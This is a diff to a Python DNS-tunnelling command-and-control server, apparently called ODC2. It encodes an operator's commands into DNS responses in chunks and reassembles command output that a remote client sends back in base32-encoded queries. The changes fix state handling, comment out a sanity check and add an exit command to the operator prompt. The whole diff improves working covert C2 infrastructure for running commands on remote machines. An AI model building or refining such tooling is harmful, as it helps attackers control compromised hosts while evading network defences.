@@ -141,6 +141,7 @@ def c2(qname):
     #try:
         global respPktCt
         global respText
+        global userInput
         request = qname.split(".")[0]
         msgType = request[:3]
         if debuggin: print(f"{OV}c2() request {OR}{request}{OV} of type {OR}{msgType}{OM}")
@@ -151,6 +152,7 @@ def c2(qname):
                 response = b"NUL"
             else: # have a command? send the command header
                 encCmd = encode64(userInput).decode('utf-8') # encode so special chars don't nuke us
+                userInput = ""
                 global chunks
                 chunks = wrap(encCmd,249) # break encoded command into chunks w/4-byte headers, 253 byte max
                 chunks.reverse() # so we can pop pieces off in order
@@ -159,16 +161,16 @@ def c2(qname):
             respPktCt = int(decode32(request).decode('utf-8').split(" ")[0])
             response = b"ACK" + bytes(str(respPktCt),'utf-8')
         elif msgType == "RES": # client sending response body
-            print(f"{OR}respText so far is {OV}{respText}{OR}, and respPktCt is {OV}{respPktCt}{OM}")
-            if respPktCt < 1:
-                print(f"{OE}Got unexpected client 'RES'{OM}")
-                response = b"DIE Unexpected RES"
-            else:
-                respPktCt -= 1
-                respText += request
-                if respPktCt == 0: # end of the thread from client? print output
-                    print(f"{OR}Command output: \n{OV}{decode32(respText)}{OM}")
-                response = ("ACK" + str(respPktCt)).encode('utf-8')
+            if debuggin: print(f"{OV}respText so far is {OR}{respText}{OV}, and respPktCt is {OR}{respPktCt}{OM}")
+            # if respPktCt < 1:
+            #     print(f"{OE}Got unexpected client 'RES'{OM}")
+            #     response = b"DIE Unexpected RES"
+            respText += request
+            respPktCt -= 1
+            if respPktCt == 0: # end of the thread from client? print output
+                print(f"{OR}Command output: \n{OV}{decode32(respText).decode('utf-8')}{OM}")
+                respText = "" # reset for next command
+            response = ("ACK" + str(respPktCt)).encode('utf-8')
         elif msgType == "CON": # client ready for more from server
             if len(chunks) < 1:
                 print(f"{OE}Got unexpected client 'CON'{OM}")
@@ -239,11 +241,13 @@ def main():
         print("%s server loop running in thread: %s" % (s.RequestHandlerClass.__name__[:3], thread.name))
     try:
         while True:
-            time.sleep(1)
+            # time.sleep(1)
             sys.stderr.flush()
             sys.stdout.flush()
             global userInput
             userInput = input(f"{OR}ODC2 {D} > {OR}")
+            if userInput == "exit":
+                raise Exception("Exit time!")
     except KeyboardInterrupt:
         pass
     finally:
